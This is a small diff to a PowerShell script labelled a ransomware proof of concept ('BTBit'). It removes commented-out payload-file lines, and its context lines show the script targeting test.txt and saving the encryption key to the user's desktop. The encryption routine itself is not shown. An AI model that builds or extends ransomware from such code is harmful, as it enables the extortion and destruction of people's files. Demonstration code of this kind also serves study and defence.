@@ -1,6 +1,4 @@
 # BTBit Powershell Ransomware PoC 
-# payload file
-# $payload = (get-location).Drive.Name + ":\payload.txt"
 # file to encrypt
 $file = "test.txt"
 #
@@ -36,6 +34,4 @@ $bytes = $Null
 # write encryption key on user's desktop
 $userDesk = [Environment]::GetFolderPath("Desktop")
 sc -Value $key -LiteralPath "$userDesk/BTBit.key" -Encoding byte
-#
-# remove payload.txt
-# rm $payload
+
